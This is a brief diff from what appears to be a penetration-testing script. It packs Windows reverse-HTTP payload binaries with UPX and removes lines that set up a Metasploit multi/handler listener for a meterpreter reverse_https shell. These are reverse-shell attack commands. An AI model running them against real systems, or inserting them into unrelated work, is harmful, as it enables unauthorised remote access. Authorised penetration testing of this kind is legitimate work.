@@ -66,9 +66,4 @@ end
 upx -9 /pentest/share/reverse.http.windows_i386.exe
 upx -9 /pentest/share/reverse.http.windows_i386.dll
 
-use exploit/multi/handler
-set PAYLOAD multi/meterpreter/reverse_https
-set ExitOnSession false
-exploit -j
-
 back
